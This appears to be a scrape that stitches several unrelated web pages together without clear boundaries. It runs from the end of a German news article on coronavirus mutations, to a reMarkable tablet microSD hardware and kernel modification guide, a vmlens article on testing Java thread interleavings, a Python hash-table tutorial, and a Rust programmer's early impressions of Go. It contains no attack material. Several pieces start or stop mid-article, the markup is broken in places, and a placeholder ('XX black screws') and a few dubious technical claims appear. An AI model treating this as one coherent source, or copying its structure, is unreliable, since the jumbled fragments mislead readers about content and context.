so Drosten. "Das heißt, das Ganze wird auf lange Sicht zu einem Schnupfen, der sich für die Lunge gar nicht mehr interessiert. So etwas könnte passieren."</p><h2>Neue Mutation könnte der Schlüssel sein</h2><div> <div> <figure> <a href="https://www.n-tv.de/mediathek/videos/panorama/Ignorante-Einzelne-bringen-alle-in-Corona-Gefahr-article21979841.html" title="Ignorante Einzelne bringen alle in Corona-Gefahr"> <picture> <source data-srcset="https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/750/imago0102595718h.jpg, https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/1136/imago0102595718h.jpg 2x" media="(max-width: 767px)"> <source data-srcset="https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/750/imago0102595718h.jpg, https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/1136/imago0102595718h.jpg 2x" media="(min-width: 768px) and (max-width: 1279px)"> <source data-srcset="https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/1136/imago0102595718h.jpg, https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/1564/imago0102595718h.jpg 2x" media="(min-width: 1280px)"> <img alt="imago0102595718h.jpg" data-src="https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/1136/imago0102595718h.jpg" src="https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/1136/imago0102595718h.jpg"> </picture></a> </figure>  </div> </div><p> Die Nase scheint für das Coronavirus tatsächlich eine wichtige Andockstelle zu sein: Was auch das häufig beobachtete Symptom der gestörten Geschmacks- und Geruchsfähigkeit erklären könnte, auf die der Essener Virologe Dittmer verweist. Denn laut einer aktuellen <a href="https://erj.ersjournals.com/content/early/2020/07/23/13993003.01948-2020" target="_blank" rel="Follow">Studie</a> konnten Forscher an der Riechschleimhaut der Nase besonders viele jener Rezeptoren nachweisen, an die das Coronavirus andockt, um sich zu vermehren. Dort befinden sich jedoch auch die Sinneszellen für das Riechen - werden diese durch das Virus angegriffen und beschädigt, können sie nicht mehr richtig arbeiten.</p><p>Gleichzeitig gibt es bereits Hinweise auf eine möglicherweise entscheidende Mutation bei Sars-CoV-2. Eine <a href="https://www.cell.com/cell/fulltext/S0092-8674(20)30820-5?_returnURL=https%3A%2F%2Flinkinghub.elsevier.com%2Fretrieve%2Fpii%2FS0092867420308205%3Fshowall%3Dtrue" target="_blank" rel="Follow">Studie </a>von Forschern um die US-Biologin Bette Korber von Anfang Juli konnte nachweisen, dass sich eine mutierte Variante des ursprünglichen Virus bereits weltweit durchgesetzt hat. Diese G-Variante zeigt eine Mutation am Spike-Protein, mit dem das Virus an Zellen andockt. Wie die Forscher herausfanden, kann diese aufgrund der Mutation besser an menschliche Zellen andocken als ihr Vorläufer, die D-Variante - und ist nach Auskunft anderer Forscher um ein Vielfaches infektiöser. Zudem tragen mit der G-Variante infizierte Menschen eine höhere Virenlast in sich.</p><p>Die ansteckendere G-Variante war im März noch relativ selten, trat dann aber unter anderem von Europa aus ihren Siegeszug über die Welt an. Im Juli trugen bereits rund 80 Prozent der Patienten weltweit die neue G-Variante in sich.

"Das könnte vielleicht in ein paar Jahren der Fall sein." Möglicherweise habe es in der Vergangenheit bei den vier bereits im Menschen vorkommenden Coronaviren, die ebenfalls meist nur harmlose Erkältungen verursachen, einen ähnlichen Verlauf gegeben. "Sie sind ziemlich sicher alle zuvor aus dem Tierreich auf den Menschen übergesprungen", so Specht. Nach einer anfänglich gefährlicheren Phase mit vielen Todesfällen könnten sie sich über lange Zeit massiv abgeschwächt haben. Möglicherweise liege der erste Kontakt mit Menschen schon Jahrhunderte zurück.</p></div></div>]]>

August 21, 2020 | http://www.davisr.me/projects/remarkable-microsd/ | <a href="https://web.archive.org/web/*/http://www.davisr.me/projects/remarkable-microsd/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
      <p>This page discusses how I added a microSD card to my <a href="https://arstechnica.com/gadgets/2017/12/remarkable-tablet-review-the-high-price-of-getting-that-paper-feeling/">reMarkable tablet</a>. I did this because I want to develop software for my rM without wearing out the internal eMMC. I chose an external card because I want to be able to swap them easily; it also makes backups faster.<br>
</p>
<img src="http://www.davisr.me/projects/remarkable-microsd/34.jpg" alt="Opened reMarkable tablet">




<h2><a name="opening">Opening the Case</a></h2>
<p>
The aluminum back panel is held to the plastic case with glue. I have 
not yet determined what melts this glue, or how to “properly” take the 
back off. I was able to lift it off, by starting slowly in a corner. 
Thereafter, I used a putty knife to slowly peel it away. The panel bent,
 but I was able to bend it mostly-flat again.
</p><p>
Next, there is a magnesium chassis screwed to the plastic case. 
Underneath the rubber feet are six silver screws. There are also XX 
black screws, that must be removed.
</p><p>
The epaper display is glued to the magnesium chassis; don’t try to pull 
it apart. There is also a white silicone-like substance around the edge 
of the epaper panel, which seems to disintegrate and flake off. I think 
it fills the gap, and perhaps offers a little waterproofing. This is 
non-replaceable. The screen can be pushed apart from the plastic 
chassis. It is held on the perimeter with plastic latches, so split it 
with a spudger and go slowly.
</p><p>
With the case off, the guts can be removed. There are five connectors to
 the logic board. In clockwise order starting at top-left: power button,
 touch panel, antenna, epaper display, USB daughterboard and buttons, 
and Wacom digitizer.
</p><p>
Finally, the logic board can be removed. It is held with six small 
screws and washers. Underneath the logic board is a plastic tape, a 
section of which must be removed around the SD pads.
</p>

<h2>
<a name="positioning">Positioning the Card</a>
</h2>
<p>
The bottom-right seemed like an appropriate placement for the card 
socket, because the area is already spacious. The right side was easier 
to route the cables to, because of the channels cut in the white plastic
 case. I reassembled the reMarkable 
prior to soldering, to ensure no bulges or deformities appered.
</p>

<img src="http://www.davisr.me/projects/remarkable-microsd/placement.JPG" alt="Placing the microSD slot in the lower right corner">

<h2>
<a name="soldering">Soldering the Wires</a>
</h2>
<p>
Using ten 30 AWG wires and plenty of flux, I connected the board to the 
socket. The board indicates which pin is first. The board has a ninth 
pin, which is used for card-detect. This gets pulled low when a card is 
inserted.
</p>

<img src="http://www.davisr.me/projects/remarkable-microsd/flatcable.JPG" alt="Wires underneath logic board">
<p>
To keep things as flat as possible, I used cellophane tape to mate the 
wires to the board. They feed out beneath the digitizer’s FFC cable in 
one beautiful ribbon. This also prevents elecrical contact to the grounded chassis.<br>
</p>

<img src="http://www.davisr.me/projects/remarkable-microsd/wires.JPG" alt="Wires on back">

<h2>
<a name="cutting">Cutting the Case</a>
</h2>
<p>
I drilled the SD slot by-hand with a rotary tool. Starting with a carving bit
 on the inside, I first hollowed out the area to give me a thin veneer, 
measured with a flashlight. Once I felt it was thin enough, I drilled 
from the front with a pointy sanding bit, and cut longitudinally.</p><p>
The magnesium chassis had a small section removed, which was easy with a
 tiny wire cutter. While it sacrifices a little
 bit of strength, it makes up for it in storage capacity.
</p><p>
After testing the fit once again, I fillited epoxy around the edge 
of the socket, gluing it down. I was careful not to get any inside the 
socket.
</p>

<img src="http://www.davisr.me/projects/remarkable-microsd/externalshot.JPG" alt="microSD slot from the outside">

<h2>
<a name="loading">Loading the Kernel</a>
</h2>
<p>The stock rM kernel doesn't enable the SDHC1 slot, which is how these
 pins are designated in the device tree file. I recommend first being 
comforable with <a href="https://github.com/torwag/remarkableflash">this remarkable-flash guide</a>, the <a href="http://www.davisr.me/projects/remarkable-microsd/i.MX_BSP_Porting_Guide_Linux.pdf">NXP porting guide for the i.MX6 processor</a>, and the <a href="http://www.davisr.me/projects/remarkable-microsd/i.MX_Yocto_Project_User%27s_Guide_Linux.pdf">i.MX Yocto user guide</a>.<br>

</p>
  <p>The rM is a mostly-vanilla i.MX6 board (many share similaries, including the <a href="http://www.davisr.me/projects/remarkable-microsd/pico-imx6ul-emmc-hobbit-reva1-hardware-manual-20160328.pdf">Hobbitboard</a>).
 As such, it shares the same SDHC interface. What the microSD slot 
connects to, and what the stock kernel does not activate, is the SDHC1 
interface. This can be enabled in the device tree, and the kernel may be
 recompiled to include support for an SD card.<br>
  </p>
<p>
By default, the sdhc1 interface is disabled in the device tree. Enabling
 this is the first step. Copy the 
<code>arch/arm/boot/dts/zero-gravitas-factory.dts</code> over 
<code>arch/arm/boot/dts/zero-gravitas.dts</code>. Then, edit it to enable the sdhc1 
interface like shown in the diff below.
</p>
<pre> &amp;usdhc1 {<br>        pinctrl-names = "default", "state_100mhz", "state_200mhz";<br>        pinctrl-0 = &lt;&amp;pinctrl_usdhc1&gt;;<br>        pinctrl-1 = &lt;&amp;pinctrl_usdhc1_100mhz&gt;;<br>        pinctrl-2 = &lt;&amp;pinctrl_usdhc1_200mhz&gt;;<br>        bus-width = &lt;4&gt;;<br>        cd-gpios = &lt;&amp;gpio4 7 GPIO_ACTIVE_LOW&gt;;<br>        disable-wp;<br>        wp-controller;<br>        keep-power-in-suspend;<br>        enable-sdio-wakeup;<br>        no-1-8-v;<br>        /*disable-wp;*/<br>-       status = "disabled";<br>+       status = "okay";<br> };
</pre>


<p>Next, <code>make zero-gravitas_defconfig</code> and edit the <code>.config</code> file produced to include the following drivers.</p><pre>CONFIG_CFG80211=y
CONFIG_MAC80211=y
CONFIG_BRCMUTIL=y
CONFIG_BRCMFMAC=y
CONFIG_RTL_CARDS=y
CONFIG_BATTERY_BQ27XXX=y
CONFIG_BATTERY_BQ27XXX_I2C=y
CONFIG_USB_ACM=y
CONFIG_USB_F_ACM=y
CONFIG_USB_U_SERIAL=y
CONFIG_USB_CDC_COMPOSITE=y
CONFIG_CRYPTO_AEAD=y
CONFIG_CRYPTO_GF128MUL=y
CONFIG_CRYPTO_NULL=y
CONFIG_CRYPTO_CCM=y
CONFIG_CRYPTO_GCM=y
CONFIG_CRYPTO_SEQIV=y
CONFIG_CRYPTO_CTR=y
CONFIG_CRYPTO_GHASH=y
CONFIG_CRYPTO_ARC4=y
</pre>
<p>
Once done, rebuild the Linux kernel with <code>make</code>. Copy the artifacts to the rM's <code>/boot</code> directory: <code>arch/arm/boot/dts/zero-gravitas.dtb</code> and <code>arch/arm/boot/zImage</code>. I have included my artifacts <a href="http://www.davisr.me/projects/remarkable-microsd/boot.tar">here</a> for posterity, but it is foolish to install a kernel that someone else compiled.<br>
</p><p>
Reboot the rM, to make sure xochitl still runs. Then, check <code>dmesg | grep
 ‘mmc0’</code> to ensure the card was detected, and double-check it with <code>fdisk 
-l</code>. Partition your card as you like, then change the /etc/fstab option 
to mount that partition at /home.
</p>
<pre>root@reMarkable:~# dmesg | grep mmc0

<p>
Reboot, and bask in the increased storage capacity.

<ul>
<li>Now, the aluminum back is held on with gaffer tape. I am afraid to glue it shut, in case I want to access the guts again.
</li><li>Maybe the white stuff that came out around the bezel can be replaced with calk</li><li>I wish I had used multicolor wires, because it was difficult following them with my eyes.
</li><li>I didn’t cut close enough to the top of the plastic case, and 
so my SD slot is taller than it needs to be, but it isn't very 
noticable. I shimmed the extra vertical space with a folded up business 
card for a tighter fit.
</li><li>Before using solid-core wirewrap wire, I tried making my own 
ribbon cable with magenet wire and masking tape. This didn’t work well, 
because the enamel was hard to remove from just the ends, and the 
masking tape was too thick. The wirewrap wire turned out much nicer.
</li><li>Technically, I think the IMX needs to be changed too (and 
re-wrote over /dev/mmcblk1boot0) but I didn’t do this, and it seems to 
work alright. I'm fine using it just for the data partition so my OS updates work.
</li>
<li>I am glad this article has created encouragement from other people. I
 would like to extend an offer: if you would like a microSD card in your
 rM, and are willing to let me install one with the possibility of it 
not coming out exactly perfect (i.e. someone who finds ultimate use of 
rM in its utility, not pristine beauty) I would like to refine this 
process. One thing could be to install an internal card using quality 
flash media. I would like to know how many people could go for something
 like that, and if there could be a market doing that kind of thing. I 
will soon have installed my own CNC machine, and can practice doing this
 modification better, eventually charging for the service.<br>

<div>
      <p>Unit-testing multi-threaded Java seams impossible. Bugs depend on the specific timing of the threads and sometimes even on the specific processor type or JVM. But by using byte-code transformations it is possible to test all thread interleavings for a given unit test.</p>
<p>I have implemented those transformations in <a href="https://vmlens.com/">the open-source tool vmlens.</a></p>

<p>The number of current CPU cores is growing exponentially. While it took four years to go from two cores to eight in the year 2009, it took only one year to go from 32 to 64 in the year 2018.  The following figure shows the growth of cores for server CPUs. To utilize all those cores we need scalable, multi-threaded software.</p>
<p><img src="https://vmlens.com/img/articles/scale/developmentOfCoreCountOfServerCPUs.png"></p>

<p>The JVM offers numerous techniques, frameworks, and open source libraries for multi-threaded programming. You can use threads, Executors, the ForkJoin framework, parallel streams, actors, to name a few of them. But until now, it was not possible to write a unit test for multi-threaded software. So to <a href="https://pragprog.com/tips/">test early, test often, test automatically</a> was not possible. And also techniques that require unit tests like re-factoring or test-driven design.</p>

<p>But by using byte-code transformations, it is now possible to test all thread interleavings. The idea is to use an automatic test and re-run the test for each possible thread interleaving using vmlens. The following example shows this for a unit test using java.util.concurrent.ConcurrentHashMap to collect statistics. You can download the example <a href="https://github.com/vmlens/vmlens-examples">from GitHub here.</a></p>
<pre>import com.vmlens.api.AllInterleavings;
public class TestUpdateWrong {
	public void update(ConcurrentHashMap&lt;Integer, Integer&gt; map) {
		Integer result = map.get(1);
		if (result == null) {
			map.put(1, 1);
		} else {
			map.put(1, result + 1);
		}
	}
	@Test
	public void testUpdate() throws InterruptedException {
		try (AllInterleavings allInterleavings = 
				new AllInterleavings("TestUpdateWrong");) {
			while (allInterleavings.hasNext()) {
				final ConcurrentHashMap&lt;Integer, Integer&gt; map = 
						new ConcurrentHashMap&lt;Integer, Integer&gt;();
				Thread first = new Thread(() -&gt; {
					update(map);
				});
				Thread second = new Thread(() -&gt; {
					update(map);
				});
				first.start();
				second.start();
				first.join();
				second.join();
				assertEquals(2, 
				  map.get(1).intValue());
			}
		}
	}
}</pre>
<p>The test uses two threads to update the ConcurrentHashMap. Each test run uses a new map and new threads. After a test run, we check if both threads incremented the counter inside the map. To test all thread interleavings we put the complete test in a while loop iterating over all thread interleavings using the class <a href="https://vmlens.com/apidocs/api/1.0/com/vmlens/api/AllInterleavings.html">AllInterleavings.</a></p>
<p>The test fails with the error message:</p>
<pre>Failures: 
  TestUpdateWrong.testUpdate:45 expected:&lt;2&gt; but was:&lt;1&gt;</pre>
<p>The test fails because for one interleaving the two threads first both get null out of the map. And then both threads insert one into the map.</p>
<p>When running the test, you need to make sure that vmlens is added as Java-agent to the JVM. You can either do this by using maven, <a href="https://vmlens.com/help/manual/#running-tests-maven">as described here</a>, or by using eclipse, <a href="https://vmlens.com/help/manual/#run-eclipse">as described here</a>.</p>

<p>How can we calculate all thread interleavings? The idea is to identify all atomic and instantly visible operations and method calls. And to execute all combinations of those operations and method calls. Well not all, only those which can lead to a different outcome. In our example test, the methods get and set from ConcurrentHashMap are atomic and instantly visible. To calculate all possible thread interleavings is possible as long as our test is data race free. Therefore we check for each interleaving if the test run is data race free.</p>
<p>Data races are incorrect synchronized reads and writes to the same memory location from different threads. When a data race happens and when an application is correctly synchronized is defined in the Java Memory Model.</p>
<p>That we can use such a two-step approach for testing is no surprise but rather a <a href="https://vmlens.com/articles/cp/java_memory_model_enables_tests/">consequence of the Java Memory Model</a>.</p>

<p>Testing multi-threaded software by executing all thread interleavings is not new. The tool <a href="https://concuerror.com/">Concuerror</a> implements this approach for the language Erlang, a programming language without shared memory. Finding data races at runtime is also not new. A prominent example is <a href="https://github.com/google/sanitizers/wiki/ThreadSanitizerCppManual">ThreadSanitizer which detects data races in C++ programs</a> and <a href="https://blog.golang.org/race-detector">golang</a> and <a href="https://openjdk.java.net/jeps/8208520">Java</a>.</p>
<p>New is the combination of those two techniques to test Java, a language with shared memory.</p>

<p>O.k. so we calculated all thread interleavings and know for which interleaving a test failed. We can show this interleaving in a report. This makes debugging of the failed test possible, almost for free. Here is the interleaving which led to the failure of the example test:</p>
<p><img src="https://vmlens.com/img/help/readModifyWriteWithoutTitle.png"></p>
<p>In case of the failure, both threads first call get. And then both threads call put. So the second thread overwrites the value of the first thread.</p>

<p>By using byte-code transformations, vmlens makes it possible to test all thread interleavings for a given unit test. To calculate all potential thread interleavings is possible since we check that the given unit test is data race free.</p>
<p>We can take an automatic test and surround it by a while loop iterating over all thread interleavings. Unit testing makes it possible to test early, test often, test automatically even for multi-threaded code. And to apply techniques like refactoring and test-driven design to multi-threaded code.</p>

<p>Hi guys, have you ever wondered how can Python dictionaries be so fast and reliable? The answer is that they are built on top of another technology: <strong>hash tables</strong>.</p>

<p>Knowing how Python hash tables work will give you a deeper understanding of how dictionaries work and this could be a great advantage for your Python understanding because dictionaries are almost everywhere in Python.</p>

<h2 id="hash-functions">Hash Functions</h2>

<p>Before introducing hash tables and their Python implementation you have to know what is a hash function and how it works.</p>

<p>A hash function is a function that can map a piece of data of any length to a fixed-length value, called <strong>hash</strong>.</p>

<p>Hash functions have three major characteristics:</p>

<ol>
  <li>They are <strong>fast to compute</strong>: calculate the hash of a piece of data have to be a fast operation.</li>
  <li>They are <strong>deterministic</strong>: the same string will always produce the same hash.</li>
  <li>They produce <strong>fixed-length</strong> values: it doesn’t matter if your input is one, ten, or ten thousand bytes, the resulting hash will be always of a fixed, predetermined length.</li>
</ol>

<p>Another characteristic that is quite common in hash functions is that they often are <strong>one-way functions</strong>: thanks to a voluntary data loss implemented in the function, you can get a hash from a string but you can’t get the original string from a hash. This is not a mandatory feature for every hash functions but becomes important when they have to be cryptographically secure.</p>

<p>Some popular hash algorithms are <a href="https://en.wikipedia.org/wiki/MD5">MD5</a>, <a href="https://en.wikipedia.org/wiki/SHA-1">SHA-1</a>, <a href="https://en.wikipedia.org/wiki/SHA-2">SHA-2</a>, <a href="https://it.wikipedia.org/wiki/NTLM">NTLM</a>.</p>

<p>If you want to try one of these algorithms by yourself, just point your browser to https://www.md5online.org, insert a text of any length in the textbox, click the <code>crypt</code> button and get your 128bit MD5 hash back.</p>

<h2 id="common-usages-of-hashes">Common Usages of Hashes</h2>

<p>There are a lot of things that rely on hashes, and hash tables are just one of them. Other common usages of hashes are for cryptographic and security reasons.</p>

<p>A concrete example of this is when you try to download open-source software from the internet. Usually, you find also a companion file that is the signature of the file. This signature is just the hash of the original file and it’s very useful because if you calculate the hash of the original file by yourself and you check it against the signature that the site provides, you can be sure that the file you downloaded hasn’t have tampered.</p>

<p>Another common use of hashes is to store user passwords. Have you ever asked yourself why when you forget the password of a website and you try to recover it the site usually lets you choose another password instead of giving back to you the original one you chose? The answer is that the website doesn’t store the entire password you choose, but just its hash.</p>

<p>This is done for security reasons because if some hacker got the access to the site’s database, they won’t be able to know your password but just the hash of your password, and since hash functions are often one-way functions you can be sure that they will never be able to get back to your password starting from the hash.</p>

<h2 id="the-python-hash-function">The Python <code>hash()</code> Function</h2>

<p>Python has a built-in function to generate the hash of an object, the <code>hash()</code> function.
This function takes an object as input and returns the hash as an integer.</p>

<p>Internally, this function invokes the <code>.__hash__()</code> method of the input object, so if you want to make your custom class hashable, all you have to do is to implement the <code>.__hash__()</code> method to return an integer based on the internal state of your object.</p>

<p>Now, try to start the Python interpreter and play with the <code>hash()</code> function a little bit. For the first experiment, try to hash some numeric values:</p>

<pre><code>&gt;&gt;&gt; hash(1)
1
&gt;&gt;&gt; hash(10)
10
&gt;&gt;&gt; hash(10.00)
10
&gt;&gt;&gt; hash(10.01)
230584300921368586
&gt;&gt;&gt; hash(-10.01)
-230584300921368586
</code></pre>

<p>If you are wondering why these hashes seems to have different length remember that the Python <code>hash()</code> function returns <strong>integers</strong> objects, that are always represented with 24 bytes on a standard 64 bit Python 3 interpreter.</p>

<p>As you can see, by default the hash value of an integer value is the value itself. Note that this works regardless of the type of the value you are hashing, so the integer <code>1</code> and the float <code>1.0</code> have the same hash: <code>1</code>.</p>

<p>What’s so special about this? Well, this shows what you learned earlier, that is that hash functions are often one-way functions: if two different objects may have the same hash, it’s impossible to do the reverse process starting from a hash and going back to the original object. In this case, the information about the type of the original hashed object has gone lost.</p>

<p>Another couple of interesting things you could note by hashing numbers is that decimal numbers have hashes that are different from their value and that negative values have negative hashes. But what happens if you try to hash the same number you got for the decimal value? The answer is that you get the same hash, as shown in the following example:</p>

<pre><code>&gt;&gt;&gt; hash(0.1)
230584300921369408
&gt;&gt;&gt; hash(230584300921369408)
230584300921369408
&gt;&gt;&gt; hash(0.1) == hash(230584300921369408)
True
</code></pre>

<p>As you can see, the hash of the integer number <code>230584300921369408</code> is the same as the hash of the number <code>0.1</code>. And this is perfectly normal if you think of what you learned earlier about hash functions because if you can hash any number or any string getting a fixed-length value since you can’t have infinite values represented by a fixed-length value, that implies that there must be duplicated values. They exist in fact, and they are called <strong>collisions</strong>. When two objects have the same hash, it is said that they collide.</p>

<p>Hashing a string is not much different from hashing a numeric value. Start your Python interpreter and have a try hashing a string:</p>

<pre><code>&gt;&gt;&gt; hash("Bad Behaviour")
7164800052134507161
</code></pre>

<p>As you can see a string is hashable and produce a numeric value as well but if you have tried to run this command you could see that your Python interpreter hasn’t returned the same result of the example above. That’s because starting from Python 3.3 values of strings and bytes objects are <strong>salted</strong> with a random value before the hashing process. This means that the value of the string is modified with a random value that changes every time your interpreter starts, before getting hashed. If you want to override this behaviour, you can set the <code>PYTHONHASHSEED</code> environment variable to an integer value greater than zero before starting the interpreter.</p>

<p>As you may expect this is a security feature. Earlier you learned that websites usually store the hash of your password instead of the password itself to prevent an attack to the site’s database to stole all the site passwords. If a website stores just the hash as it is calculated it could be easy for attackers to know what was the original password. They just need to get a big list of commonly used passwords (the web is full of these lists) and calculate their corresponding hash to get what is usually called <strong>rainbow tables</strong>.</p>

<p>By using a rainbow table the attacker may not be able to get <strong>every</strong> password in the database, still being able to steal a <strong>vast majority of them</strong>. To prevent this kind of attack, a good idea is to <strong>salt</strong> the password before hashing them, which is modifying the password with a random value before calculating the hash.</p>

<p>Starting from Python 3.3 the interpreter by default salt every string and bytes object before hashing it, preventing possible DOS attacks as demonstrated by Scott Crosby and Dan Wallach on <a href="https://static.usenix.org/event/sec03/tech/full_papers/crosby/crosby_html/">this 2003 paper</a>.</p>

<p>A DOS attack (where DOS stands for Denial Of Service) is an attack where the resources of a computer system are deliberately exhausted by the attacker so that the system is no longer able to provide service to the clients. In this specific case of the attack demonstrated by Scott Crosby, the attack was possible flooding the target system with a lot of data whose hash collide, making the target system use a lot more of computing power to resolve the collisions.</p>

<h2 id="python-hashable-types">Python Hashable Types</h2>

<p>So at this point, you could wonder if any Python type is hashable.
The answer to this question is no, by default, just immutable types are hashable in Python. In case you are using an immutable container (like a tuple) also the content should be immutable to be hashable.</p>

<p>Trying to get the hash of an unashable type in Python you will get a <code>TypeError</code> from the interpreter as shown in the following example:</p>

<pre><code>&gt;&gt;&gt; hash(["R","e","a","l","P","y","t","h","o","n"])
Traceback (most recent call last):
 File "&lt;stdin&gt;", line 1, in &lt;module&gt;
TypeError: unhashable type: 'list'
</code></pre>

<p>However, every custom defined object is hashable in Python and by default its hash is derived from it’s id. That means that two different instance of a same class, by default have different hashes, as shown in the following example:</p>

<pre><code>&gt;&gt;&gt; class Car():
...     velocity = 0
...     direction = 0
...     damage = 0
...
&gt;&gt;&gt; first_car = Car()
&gt;&gt;&gt; second_car = Car()
&gt;&gt;&gt; hash(first_car)
274643597
&gt;&gt;&gt; hash(second_car)
274643604
</code></pre>

<p>As you can see, two different instances of the same custom object by default have different hash values. However, this behavior can be modified by implementing a <code>.__hash__()</code> method inside the custom class.</p>

<h2 id="hash-tables">Hash Tables</h2>

<p>Now that you know what a hash function is, you can start examining hash tables. A hash table is a data structure that allows you to store a collection of key-value pairs.</p>

<p>In a hash table, the key of every key-value pair must be hashable, because the pairs stored are indexed by using the hash of their keys. Hash tables are very useful because the average number of instructions that are necessary to lookup an element of the table is independent of the number of elements stored in the table itself. That means that even if your table grows ten or ten thousand times, the overall speed to look up a specific element is not affected.</p>

<p>A hash table is typically implemented by creating a variable number of <strong>buckets</strong> that will contain your data and indexing this data by hashing their keys. The hash value of the key will determine the correct bucket to be used for that …</p></section></div>

            <section>
                <!--kg-card-begin: markdown--><p>This post was originally published on the <a href="https://pingcap.com/blog/early-impressions-of-go-from-a-rust-programmer/">PingCAP blog</a>.</p>
<p>I've been using <a href="https://en.wikipedia.org/wiki/Go_(programming_language)">Go</a> for the past few weeks. It's my first time using Go for a large (-ish), serious project. I've previously looked at Go a lot and played with examples and toy programs when researching features for <a href="https://en.wikipedia.org/wiki/Rust_(programming_language)">Rust</a>. Real programming is a very different experience.</p>
<p>I thought it would be interesting to write about my impressions. I'll try and avoid too much comparison with Rust, but since that is the language I'm coming from, there will be some. I should declare in advance a strong bias for Rust, but I'll do my best to be objective.</p>
<h2 id="generalimpression">General impression</h2>
<p>Programming with Go is nice. It had everything I wanted in the libraries and there were not too many rough edges. Learning it was a smooth experience, and it is a well-designed and practical language. Some examples: once you know the syntax, many idioms from other languages carry over to Go. Once you've learned some Go, it is relatively easy to predict other features. With some knowledge of other languages, I was able to read Go code and understand it without too much googling.</p>
<p>It is a lot less frustrating and a lot more productive than using C/C++, Java, Python, etc. It did feel, however, like part of that generation of languages. It has learnt some lessons from them, and I think it is probably the best language of that generation; but it is definitely part of that generation. It is an incremental improvement, rather than doing something radically different (to be clear, this is not a value judgement, incremental is often good in software engineering). A good example of this is <code>nil</code>: languages like Rust and Swift have removed the concept of <code>null</code> and eliminated a whole class of errors. Go makes it a bit less dangerous: no null <em>values</em>, distinguishes between <code>nil</code> and <code>0</code>. But the core idea is still there, and so is the common runtime error of dereferencing a null pointer.</p>
<h2 id="learnability">Learnability</h2>
<p>Go is incredibly easy to learn. I know this is an often-touted benefit, but I was really surprised how quickly I was able to be productive. Thanks to the language, docs, and tools, I was writing 'interesting', commit-able code after literally two days.</p>
<p>A few factors contributing to learnability are:</p>
<ul>
<li>Go is small. Lots of languages try to be small, Go really is small; really small. (This is mostly a good thing and I'm impressed with the discipline this must have taken).</li>
<li>The standard library is good (and again, small). Finding and using libraries from the ecosystem is very easy.</li>
<li>There is very little in the language which is not in other languages. Go takes lots of bits from other established languages, polishes them, and puts them together nicely. It tries very hard to avoid novelty.</li>
</ul>
<h2 id="boilerplate">Boilerplate</h2>
<p>Go code becomes very repetitive very quickly. It is missing any mechanism like macros or generics for reducing repetition (interfaces are nice for abstraction, but don't work so well to reduce code duplication). I often end up with lots of functions, identical except for types.</p>
<p>Error handling also causes repetition. Many functions have more <code>if err != nil { return err }</code> boilerplate than interesting code.</p>
<p>Using generics or macros to reduce boilerplate is sometimes criticised for making code easy to write at the expense of making it harder to read. But I found the opposite with Go. It is quick and easy to copy and paste code, but reading Go code is frustrating because you have to ignore so much of it or search for subtle differences.</p>
<h2 id="thingsilike">Things I like</h2>
<ul>
<li>Compile times. Definitely quick; definitely a lot quicker than Rust. But not actually as quick as I was expecting (it feels to me to be similar to or a little faster than C/C++ for medium to large projects, I was kind of expecting instant).</li>
<li>Go routines and channels. Having lightweight syntax for spawning Go routines and using channels is really nice. It really shows the power of syntax that such a small detail makes concurrent programming feel so much nicer than in other languages.</li>
<li>Interfaces. They're not very sophisticated but they are easy to understand and use, and useful in a lot of places.</li>
<li><code>if ...; ... { }</code> syntax. Being able to restrict the scope of variables to the body of <code>if</code> statements is nice. This has a similar effect to <code>if let</code> in Swift and Rust, but is more general purpose (Go does not have pattern matching like Swift and Rust, so it cannot use <code>if let</code>.</li>
<li>Testing and doc comments are easy to use.</li>
<li>The <code>Go</code> tool is nice - having everything in one place rather than requiring multiple tools on the command line.</li>
<li>Having a garbage collector (GC)! Not thinking about memory management really does make programming easier.</li>
<li>Varargs.</li>
</ul>
<h2 id="thingsididnotlike">Things I did not like</h2>
<p>In no particular order.</p>
<ul>
<li><code>nil</code> slices - <code>nil</code>, a <code>nil</code> slice, and an empty slice are all different. I'm pretty sure you only need two of those things, not three.</li>
<li>No first class enums. Using constants feels backwards.</li>
<li>Disallowing import cycles. This really limits how useful packages are for modularising a project, since it encourages putting lots of files in a package (or having lots of small packages, which can be just as bad if files which should be together are not).</li>
<li><code>switch</code> may be non-exhaustive.</li>
<li><code>for ... range</code> returns a pair of index/value. Getting just the index is easy (just ignore the value) but getting just the value requires being explicit. This seems back-to-front to me since I need the value and not the index in most cases.</li>
<li>Syntax:
<ul>
<li>Inconsistency between definitions and uses.</li>
<li>Pickiness of the compiler (e.g., requiring or forbidding trailing commas); this is mostly alleviated by good tooling, but there a still a few times when this creates an annoying extra step.</li>
<li>When using multiple-value return types, parentheses are required on the type, but not in the <code>return</code> statement.</li>
<li>Declaring a struct requires two keywords (<code>type</code> and <code>struct</code>).</li>
<li>Using capitalisation for marking variables public or private. It's like Hungarian notation but worse.</li>
</ul>
</li>
<li>Implicit interfaces. I know I have this on my thing I like list too, but sometimes it is really annoying - e.g., trying to find all types which implement an interface, or which interfaces are implemented for a given type.</li>
<li>You can't write functions with a receiver in a different package, so even though interfaces are 'duck typed' they can't be implemented for upstream types making them much less useful.</li>
</ul>
<p>I've already mentioned the lack of generics and macros above.</p>
<h2 id="consistency">Consistency</h2>
<p>As a language designer and a programmer, probably the thing that most surprised me about Go is the frequent inconsistency between what is built-in and what is available to users. It has been a goal of many languages to eliminate as much magic as possible, and make built-in features available to users. Operator overloading is a simple, but controversial, example. Go has a lot of magic! And you very easily run into the wall of not being able to do things that built-in stuff can.</p>
<p>Some things that stood out to me:</p>
<ul>
<li>There is nice syntax for returning multiple values and for channels, but the two cannot be used together because there are no tuple types.</li>
<li>There is a <code>for ... range</code> statement for iterating over arrays and slices, but you can't iterate over other collections because there is no concept of iterators.</li>
<li>Functions like <code>len</code> and <code>append</code>, are global, but there is no way to make your own functions global. Those global functions only work with built-in types. They can also be generic, even though Go has 'no generics'!</li>
<li>There is no operator overloading, this is particularly annoying with <code>==</code> because it means you can't use custom types as keys in a map unless they are <em>comparable</em>. That property is derived from the structure of a type and can't be overridden by the programmer.</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
